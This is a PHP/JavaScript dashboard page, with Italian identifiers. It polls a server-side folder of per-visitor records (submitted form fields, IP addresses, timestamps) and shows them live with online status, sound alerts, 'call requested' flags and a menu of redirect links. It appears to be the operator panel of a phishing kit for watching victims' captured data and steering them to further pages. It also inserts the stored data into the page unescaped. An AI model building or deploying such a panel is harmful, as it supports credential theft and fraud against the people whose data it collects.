<?php

function better_scandir($dir, $sorting_order = SCANDIR_SORT_ASCENDING) {

  $files = array();
  foreach (scandir($dir, $sorting_order) as $file) {
    if ($file[0] === '.') {
      continue;
    }
    $files[$file] = filemtime($dir . '/' . $file);
  } 
  if ($sorting_order == SCANDIR_SORT_ASCENDING) {
    asort($files, SORT_NUMERIC);
  }
  else {
    arsort($files, SORT_NUMERIC);
  }
  $ret = array_keys($files);

  return ($ret) ? $ret : false;

}


$cartella ="../database";
if (!is_dir($cartella )) {
    mkdir($cartella );
}
$cartella = '../database/';
$files = scandir($cartella,SCANDIR_SORT_DESCENDING);
$lista=[];
foreach($files as $file) {
	if (strpos($file, "_0") !== false) {
		$id = str_replace("_0", "", $file);
		$lista[]=$id;
	}
}
$fattiFile = "../fatti.txt"; 
$interval = 2000; 
$textColor = ""; 

if (!file_exists('../fatti.txt')) {
    touch('../fatti.txt');
}

// Don't have to change anything bellow
if(!$textColor) $textColor = "white";
if($interval < 100)  $interval = 100; 
if(isset($_GET['getLog'])){
$fatti=array();
		$fattiFile = "../fatti.txt";
		$stream = fopen($fattiFile, "r");
	while(($line=fgets($stream))!==false) { 
		$nuovo = trim($line);
		if($nuovo){
			$fatti[]=$nuovo;
		}
		
		}
	$iniziale=array();
	foreach($lista as $id) {
		if(!in_array($id,$fatti)){
			$dfile=filemtime($cartella.$id."_0");
			$ip="";
			if(file_exists($cartella."ip_".$id)){
				$ip =$contenuto = file_get_contents($cartella."ip_".$id);
			}
			
			$dfile=date ("d/m/Y H:i", $dfile);
			$item=[$id."<br>".$dfile."<br>".$ip];
			$item=[$dfile."<br>".$ip];
			for($num = 0; $num<=10; $num++) {
				if (file_exists($cartella.$id."_".$num)) {
					$contenuto = file_get_contents($cartella.$id."_".$num);
					if($contenuto){
					$arr = json_decode($contenuto);
					$item = array_merge($item,$arr);
					}
				
				}
			}
			$iniziale[$id]=$item;
		}
	}
	echo json_encode($iniziale);
}else{
?>
	<title>Log</title>
	<style>
	.testo{
		FONT-SIZE: 130%;
	}
		#log	{  
  -webkit-user-select: text;  /* Chrome 49+ */
  -moz-user-select: text;     /* Firefox 43+ */
  -ms-user-select: text;      /* No support yet */
  user-select: text;          /* Likely future */   
}	
	</style>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>
	
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" ></script>
	<script src="underscore-min.js" type="text/javascript"></script>
	<script>

	suona=false;
		setInterval(readLogFile, <?php echo $interval; ?>);
		window.onload = readLogFile; 
	
		var scrollLock = true;
		
		$(document).ready(function(){
		
		});
		lastlog = "";
		ultimaversione =""
		function readLogFile(){

$.get("versione.php", { }, function(dataversione) {

if(ultimaversione=="" || ultimaversione!=dataversione  ){
			
jQuery.getJSON("vedi.php", { getLog : "true" }, function(data) {
				if(data !=lastlog){
					if(data!=""){
						if(ultimaversione){
							cambiato()
						}
					
					}
					

				}else{

				}
				
				lastlog=data
				tutti = [];

		        _.each(data,function( val, key){
					
					
				val=	_.map(val,function(d){
								return "<td>"+ d +"</td>"
					})
						bottoni ='';
					<?php
if(file_exists("../lista.txt")){
	$links = explode("\n", file_get_contents("../lista.txt"));

  foreach ($links as $ll) {
	  $ll=trim($ll);
?>bottoni=bottoni+'<?php echo '<a class="dropdown-item devia" href="#" data-link="'.$ll.'" >'.$ll.'</a>'; ?>';
 <?php  }
}
					?>
		
//<button class='visto btn btn-warning '>X</button>
azioni = '<div class="dropdown"> <button class="btn btn-secondary dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Azioni </button> <div class="dropdown-menu" aria-labelledby="dropdownMenuButton"> <a class=" visto dropdown-item" href="#">Fatto</a><hr> '+bottoni+' </div> </div>'
					pre="<tr class='riga ' data-key='"+key+"' ><td style='text-align:center'>"+azioni+"</td><td class='live'></td>"+val.join("")+"</tr>"
					tutti.push(pre)
				})


				$("#log tbody").html(tutti.join(""))
		     		    });
			ultimaversione = dataversione  
}

		  });
		  }
		  function cambiato(){
			  aggiornalive()	
			  if(suona){

						 var audio = new Audio('suono.wav');
				audio.play();
					}else{
								suona=true
				}

		  }
		$( document ).on( "click", ".visto", function() {
 					chiave = jQuery(this).parents("tr").data("key")
					tr = jQuery(this).parents("tr")
					
			jQuery.getJSON("visto.php", { key : chiave }, function(data) {
						if(data==1){
							tr.hide()
						}

			 });
			});
		$( document ).on( "click", ".devia", function() {
 					return false;

			 });

function aggiornalive(){
_.each(jQuery(".riga"),function(r){

	key = jQuery(r).data('key')

jQuery.getJSON("datolive.php", { id : key }, function(data) {
						console.log(data)
	var td = jQuery(r).find(".live")
	pre=''
	if(data[2].indexOf("ONLINE")!=-1){
		pre = "<img src='circle_green.png'/> "
	}
	
	if(data[2].indexOf("secondi")!=-1){
		pre = "<img src='circle_green.png'/> "
	}
	if(data[3]){
		pre = "<B>CHIAMATA RICHIESTA</B><BR>"+pre
	}
td.html(pre+data[2]+"<br>"+data[0])
			 });
})

}
			setInterval(function(){

				aggiornalive()	
			},3000)
	</script>
		<br>
		<div id="log" class="container-fluid">
			<table class="table table-bordered table-hover">
			<tbody>
			</tbody>
			</table>
		</div><br><br>

<?php  } ?>